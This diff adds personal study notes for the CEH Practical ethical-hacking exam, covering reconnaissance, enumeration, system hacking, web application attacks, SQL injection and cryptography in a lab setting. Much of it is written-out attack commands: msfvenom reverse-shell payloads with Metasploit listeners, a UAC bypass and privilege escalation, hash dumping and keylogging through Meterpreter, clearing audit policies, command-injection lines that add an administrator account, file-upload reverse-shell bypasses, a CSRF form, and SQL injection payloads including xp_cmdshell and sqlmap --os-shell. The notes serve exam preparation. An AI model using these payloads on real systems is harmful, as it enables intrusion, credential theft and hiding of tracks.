@@ -1,0 +1,618 @@
+CEH Practical - Rough notes
+
+Youtube - https://youtu.be/ycZFk-GT5-I
+
+Module 1 - Footprinting and Reconnaissance 
+
+Ping 10.10.10.16
+
+Ping www.moviescope.com -f -l 1500
+//packet needs to be fragmented but DF set.
+
+
+Ping www.moviescope.com -f -l 1300
+//-l means to the buffer size
+
+
+Ping www.moviescope.com -f -l 1473
+//packet needs to be fragmented but DF set.
+
+Ping www.moviescope.com -f -l 1472
+//The command replies with a successful ping.
+//The maximum frame size will differ depending upon the target network
+
+tracert www.moviescope.com
+//used for counting the hops between system and target
+
+Collecting website information using firebug tool
+//firebug browser extension - is just like browser developer tools
+//find the server version and language/framework used for the website
+
+
+Analyse all directories of a website: using HTTrack web site copier tool (website mirroring - win tool)
+
+Advanced network route tracing using Path Analyser Pro(win tool):
+//Just like tracers, - shows IPs of all hops
+
+Information gathering using metasploit:
+
+Service postgresql start
+Msfconsole
+db_status (if no connection, exit msf)
+Msfdb init
+Service postgresql restart
+Msfconsole
+db_status(connected)
+
+nmap -Pn -sS -A -oX Test 10.10.10.0/24
+//showing the total number of active hosts in the subnet
+
+db_import Test
+hosts
+db_nmap -sS -A 10.10.10.16 
+//scanning a host probably a windows server machines and fetching service information
+
+services
+//to get all active machines service information
+
+use scanner/smb/smb_version
+set RHOSTS 10.10.10.8-16 
+set THREADS 100
+run
+//os information collected 
+
+hosts
+//to display collected all os_flavor information at once
+
+
+
+Module 2 - Enumeration
+
+Global network inventory tool
+//Provide an IP range, if you have the credentials, fill in the connect as form. Walkthrough all tab and hover on each row to see details.
+
+Advanced IP scanner
+//Identify the devices on your network that are open to known vulnerabilities
+//enumerating user accounts, groups, shared folders, softwares installed. In short, enumeration!
+
+Super scan
+//NETBIOS information, also like advanced IP scanner capabilities, TCP and UDP open ports
+//Identify policies and passwords
+
+Hyena
+//like all above, additional - application and banners
+
+
+NETBIOS enumerator
+//target user names, MAC address and domain group
+//account lockout threshold
+//local groups and user accounts
+//global groups and user accounts 
+
+
+SoftPerfect network scanner
+//hardware MAC address across routers
+//hidden shared folders and writable ones
+//Internal and external IP address
+
+
+Nmap
+//usernames and user groups
+//Lists of computers, their OS and the ports on them
+// machine names, network resources and services
+//lists of shares on the individual lists on the network
+//policies and passwords
+
+
+nbtstat- A host_ip
+//on Windows system on same network range
+//to find out the netbios remote machines name table
+
+net use
+//to view the created null sessions/shared folders from your host
+
+
+net use \\<host_ip>\e “”\user:””
+net use \\<host_ip>\e “”/user:””
+//creates null session
+//here “e” is all session name
+//Go to your file explorer and see a new drive (probably z:\)
+//issue “net use” command to see a newly created/connects of null sessions
+
+
+nmap -sP 10.10.10.0/24 
+//initiates the ping sweep scan 
+//scans all nodes on the given network range and starts displaying all the hosts that are up and running. Along with their respective MAC addresses and device information.
+//Now you can choose an active machine IP from result and perform stealthy scan using -sS
+// SYN scan with version and OS detection using -sSV -O 
+//-oN enumerationOutput.txt saves the output in home directory 
+
+
+SNMP enumeration using snmp_enum
+//enumerate users’ accounts and devices on a SNMP enabled computer.
+//comes with 2 passwords - to configure and one to access the SNMP agent from the management station.
+
+Nmap -sU -p 161 <ip>
+nmap -sU -p 161 —script=snmp-brute <ip>
+//output will be public - valid credentials, now lets make use of metas-loot framework
+
+Msfconsole
+Use auxiliary/scanner/snmp/snmp_login
+Set RHOSTS <ip>
+
+Use auxiliary/scanner/snmp/snmp_enum
+Set RHOSTS <ip>
+
+
+LDAP enumeration using active directory explorer (ADExplorer)
+//provide the IP and start scanning
+//it will list the active directory structure which contains user list
+//modify any one user name from the list
+
+
+Enum4linux -u Martin -p apple -U 10.10.10.12
+Enum4linux -u Martin -p apple -o 10.10.10.12
+//OS details
+Enum4linux -u Martin -p apple -P 10.10.10.12
+//password policy information
+Enum4linux -u Martin -p apple -G 10.10.10.12
+//groups information
+Enum4linux -u Martin -p apple -S 10.10.10.12
+//share policy information
+
+
+
+Module 3 - Vulnerability Analysis
+
+In this model, we scan the host to identify any known vulnerabilities from running services on the host. Scanning for services in open ports, banner grabbing etc.
+
+Using Nesus and Nikto
+
+
+Module 4 - System hacking
+
+The goal of system hacking is to gain access, escalate privileges, execute applications, and. Hide files
+
+extracting admin passwords
+Hiding and recovering hidden files
+Recovering passwords
+Monitoring a system remotely
+
+Dumping and cracking SAM hashes to extract plaintext passwords
+
+use pwdump7 tool to extract password hashes
+Use Ophcrack tool to crack the passwords and obtain plaintext
+
+//Open cmd with admin privileges
+ wmic 	useraccount get name,sid 
+//This command displays user account names and their respective IDs
+
+pwdump7.exe 
+//just have to run this command in the given tool folder, it will extract the password hashes of all users
+
+pwdump7.exe > C:\hashes.txt 
+//this will save the password hashes in a file for later use.
+
+
+//Open and run the ophcrack tool and load the pwddummp file from above command saved file
+//for tables, select vista free and install
+
+
+Creating and using a rainbow tables
+//make use of winrtgen tool
+//set min len 4, max len 6, counts 4000000, select loweralpha from charset list and start generating the hashes by clicking on OK. It takes approximately 1 hour to generate and store it in the same directory.
+//Now the generate file is used by other cracking tool like RainbowCrack
+
+
+Auditing the system passwords using L0phtCrack
+//Audit password wizard, provide all details like host, specific username and password etc. for remote system, and select appropriate options
+//It will take a lot of time to crack the password
+
+
+Exploiting client side vulnerabilities and establishing a VNC session
+//on kali machine
+Msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe 
+
+//move the Test.exe to /var/www/html/share directory which has 755 permission and www-data owner
+
+Service apache2 start
+//start apache server
+
+msfconsole
+Use multi/handler
+Set payload windows/meterpreter/reverse_tcp
+Set LHOST 10.10.10.11
+Set LPORT 444
+Run
+
+
+Now switch to victim’s machine/windows
+Open http://10.10.10.11/share and click on Test.exe and save the file
+
+
+//Now switch back to kali and see a new session will be opened with meterpreter level
+sysinfo
+run vnc  
+
+
+Escalate the privileges by exploiting client side vulnerabilities
+//on kali machine
+msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86/shikata_ga_nai -b “\x00” -f exe LHOST=10.10.10.11 > Desktop/Exploit.exe
+
+//move the Exploit.exe to /var/www/html/share directory which has 755 permission and www-data owner
+
+msfconsole
+Use multi/handler
+Set payload windows/meterpreter/reverse_tcp
+Set LHOST 10.10.10.11
+exploit -j -z
+
+
+Now switch to victim’s machine/windows
+Open http://10.10.10.11/share and click on Exploit.exe and run the file
+
+Now go back to kali - attacking machine and observe a new session is opened in the background
+Sessions -I 1 
+//it will open the shell in interactive mode again from the background
+
+meterpreter>getuid
+meterpreter>Run post/windows/gather/smart_hashdump
+meterpreter> getsystem -t 1
+//which uses the service - names pipe impersonation (in memory/admin) technique
+//but this technique fails
+
+meterpreter>background
+//background the session
+
+use exploit/windows/local/bypassuac_fodhelper 
+show options
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 10.10.10.11
+set TARGET 0
+exploit
+//Now it begins to exploit the UAC settings in windows 10 machine
+
+meterpreter>getuid
+//still running the normal user
+
+meterpreter>getsystem
+//elevates the privileges 
+meterpreter>getuid
+//now running AUTHORITY\SYSTEM user
+
+meterpreter>run post/windows/gather/smart_hashdump
+//gets admin user’s NTLM hash
+Hacking windows 10 using metasploit, and post-exploitation using meterpreter
+
+msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86-e x86/shikata_ga_nai -b “\x00” -f exe LHOST=10.10.10.11 > Desktop/Backdoor.exe
+
+Service apache2 start
+
+//move the backdoor.exe to /var/www/html/share directory which has 755 permission and www-data owner
+
+msfconsole
+Use exploit/multi/handler
+Set payload windows/meterpreter/reverse_tcp
+Set LHOST 10.10.10.11
+exploit -j -z
+
+
+Now switch to victim’s machine/windows
+Open http://10.10.10.11/share and click on Backdoor.exe and run the file
+
+Now go back to kali - attacking machine and observe a new session is opened in the background
+Sessions -I 1 
+//it will open the shell in interactive mode again from the background
+meterpreter>sysinfo
+meterpreter>ipconfig
+
+Timestomp secret.txt -v
+//To view the MACE attribute of secret.txt. Created, accessed, modified and entry modified time
+
+download bootmgr
+//will be downloaded to kali/attacking machine
+
+search -f pageful.sys
+//just like find command from kali
+
+keyscan_start 
+//this will start capturing the keyboard input from victim machine
+
+keyscan_dump
+//dumps all keystrokes
+
+ideltime
+//this will display the number of seconds the user has been idle on the remote system
+
+shutdown
+//will shutdown the victim machine
+
+
+User system monitoring and surveillance using spytech and spyagent 
+//Install and setup the spytech tool
+
+Web activity monitoring and recording using power spy
+
+Hiding files using NTFS streams
+//this method works only on NTFS format drive
+//For example let’s copy calc.exe file from system32/ and paste in C:\Magic folder
+//Open CMD and cd to c:\magic
+Notepad readme.txt 
+//add hello world in the file
+//now dir to check the size of readme.txt for example 13 bytes
+type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+//now also the size of readme.txt file is same 13 bytes
+
+mklink backdorr.exe readme.txt:calc.exe 
+//creates symbolic links for readme.txt:calc.exe file in the name of backdoor.exe
+
+Backdoor.exe
+//it will open the calc.exe file, that is calculator
+
+ 
+Hiding data using white space steganographic
+//Create a file - readme.txt and store it in snow tool folder under white-space steganography directory
+
+C:\….\snow>snow -C -m “some secret message” -p “random password” readme.txt readme2.txt 
+
+//now the secret message is stored is hidden inside readme2.txt file with the content of readme.txt
+
+//the content includes “secret message” + readme.txt file
+
+snow -C -p “random password” readme2.txt 
+//this will show you the content of actual readme.txt, that is secret message
+
+
+Image stenography using OpenStego
+//easy to use openstego tool
+//put a secret message file and a cover file to hide it
+
+Image stenography using Quick Stego
+//it’s easy to use quick stego tool
+
+
+Viewing, enabling and clearing audit policies using auditpol
+cmd> auditpol /get /category:*
+//to view all audit policies
+
+
+cmd> auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
+//to enable the audit policies
+
+
+cmd> auditpol /get /category:*
+//tocheck whether audit policies are enabled or not
+
+cmd> auditpol /clear /y
+//to clear audit policies
+
+cmd> auditpol /get /category:*
+//tocheck whether audit policies are cleared or not
+
+
+Convert channels using Convert_TCP
+//helps you to hide/add a data in TCP/IP header unused fields.
+
+Terminal> cd Desktop; mkdir send; cd send; echo “secret message” > message.txt
+
+//Now connect to windows machine using smb//<ip> from other connections in file manager in kali machine
+//copy the covert_tcp.c to send directory
+terminal>cc -o covert_tcp covert_tcp.c 
+
+//ubuntu machine
+terminal> cd desktop; mkdir receive; cd receive
+
+//Now connect to windows machine using smb//<ip> from other connections in file manager in ubuntu machine
+
+terminal>cc -o covert_tcp covert_tcp.c
+
+//to start a listener
+terminal> ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/receive/receive..txt
+
+//back to kali machine and open Wireshark in eth0 interface
+
+terminal> ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt
+//it will start sending the file using covert_tcp
+
+
+Hacking Windows Server 2012 with a malicious office Document using TheFatRat
+TheFatRat is used to create a payload in doc format which helps in getting a reverse shell easily. Later make use of meterpreter multi/handler and windows reverse_tcp payload to start listening.
+
+Active Online Attack using Responder
+//perform LLMNR/NBT-NS spoofing attack on a network
+
+terminal> responder -I eth0
+
+//Switch victim machine and execute \\ceh-tools in RUN command/window
+
+//switch to attacking machine/kali and go to /usr/share/responder/logs folder to check the collected access hashes
+
+//now crack with John
+
+terminal> John /usr/share/responder/logs/<file name>
+
+
+
+Module 5 - Social Engineering
+
+//make use social engineering toolkit
+Website, site cloner
+
+
+Module 6 - Session Hijacking
+
+//objective - learn how to intercept the session between client and server using ZAP
+
+
+Module 7 - Hacking web servers
+
+//Web server reconnaissance using Skipfish tool
+skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://<ip>:<port>
+
+
+//Footprinting a web server using httprecon tool
+//Footprinting a web server using ID serve
+//craking FTP credentials using Dictionary attack - hydra tool
+
+//uniscan web server fingerprinting in kali - used to find type and version of the web server 
+uniscan -u http://<ip>:port/directory -q 
+//takes atleast 10 - 20 mins
+
+
+Module 8 - Hacking web application
+
+//parameter tampering & xss vulnerabilities
+
+//enumerating & hacking a web app using wpscan and metasploit
+
+wpscan —url http://<ip>:<port>/<directory> —enumerate u 
+
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+Show options
+set PASS_FILE
+set RHOSTS 10.10.10.12
+set RPORT 8080
+set TARGETURL http://10.10.10.12:8080/ceh/
+set USERNAME admin
+Run 
+
+//exploiting RCE vulnerability
+
+DVWA - command injection
+| hostname
+| dir C:\
+| net user
+| tasklist
+| whoami  
+| net user Test /Add  = here new user added
+| net user
+| net local group Administrators Test /Add = to add the user to admin group
+| net user Test
+
+Now can login to the web sever using above created user without password with the help of RDP
+
+
+//Auditing web application framework using Vega
+
+
+//File  upload vulnerability(level low) - PHP
+Note - https://www.revshells.com/
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=my_sys_ip lport=listening_port -f raw 
+
+//Upload the file and also if the response shows path where it saved, note the path
+
+msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost your_sys_ip
+set lport listening_port
+Run
+
+//browse the uploaded file and session will be opened in the metasploit
+
+
+
+//File  upload vulnerability(level medium) - JPEG or JPG
+
+Append the file type extension to previously generated php reverse shell payload
+Eg - upload.php to upload.php.jpg
+//also need burp to change the upload payload file type eg. upload.php.jpg to upload.php again and forward the request
+
+msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost your_sys_ip
+set lport listening_port
+Run
+
+//File  upload vulnerability(level high)
+Now open the upload.php in any editor and append GIF98 in the beginning and save
+Now rename it from upload.php to upload.jpg and upload it
+
+Now go to command injection in DVWA
+|copy C:\wamp64\www\DVWA\hackable\uploads\upload.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php 
+
+//the response should be 1 file copied
+
+msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost your_sys_ip
+set lport listening_port
+Run
+
+Now browse the newly copied file to get the session 
+
+
+//CSRF on Wordpress(plugin WP-firewall)
+
+Enumerate using wpscan
+wpscan -u  http://wordpress_ip:8080/CEH —enumerate vp
+
+This will display the vulnerable plugin firewall 2 
+Note down the full path where it is installed
+
+Now generate a payload eg. Like below
+
+<form method=“POST” action=“http://10.10.10.12:8080/CEH/wp-admin/options-general.php?page=wordpress-firewall-2%Fwordpress-firewall-2.php”>
+<script>alert(“As an admin, to enable additional security to your website. Click submit”)</script>
+<input type=“hidden” name=“whitelist_ip[]” value=“10.10.10.11”>
+<input type=“hidden” name=“set_whitelist_ip” value=“Set whitelisted IPs” class=“button-secondary”>
+<input type=“submit”>
+</form> 
+
+Module 9 - SQL Injection
+//The login can be bypassed using basic sql conditional based payload(username). FYI - leave the password empty
+//on the same end-point, you can insert a new record eg. Blah’;insert into login values(‘John’,’Password123’);—
+
+//on the same end-point, you can create a database eg. Blah’; create database my database;—
+
+//on the same end-point, you can perform a DOS attack eg. Blah’;exec master..xo_cmdshell ‘ping www.moviescope.com(same target url/ip) -l 65000 -t’;—
+
+
+Scanning web applications using N-Stalker tool
+
+Performing SQL injection attack against MSSQL to extract databases and web shell using SQLMAP
+//extract the logged user cookie using developer console - document.cookie
+
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” —dbs
+
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” -D moviescope —tables
+
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” -D moviescope -T User_login —columns
+
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” -D moviescope -T User_login —dump
+
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” —cookie=“Add the cookie value here” —os-shell
+
+
+
+Module 9 - Cryptography
+
+//Use HashCalc to monitor your file integrity
+//Use MD5 calculator to check your file integrity
+//use Crypto Forge tool to encrypt the decrypt the file. It support cfd 
+//encrypting and decrypting the data using BCTextEncoder
+
+//creating and using self-signed certificate
+
+Eg. Say a site is note reachable because a explicit request is made using https 
+
+Start > Windows administrative tools > Internet Information Services(IIS) Manager > then select the machine from left hand side from connection section
+
+Select server certificates from IIS section and click create self-signed certificate(on the right hand side Action items)
+
+Now give any name for the certificate and choose personal
+
+Now choose the site, to bind from site folder(left hand side) and provide all details(https, IP, hostname, select the certificate) on the wizard
+
+Now refresh the site from site section and load the site on the browser on https
+
+
+//basic disk encryption using veraCrypt
+
+//basic data encryption using CrypTool
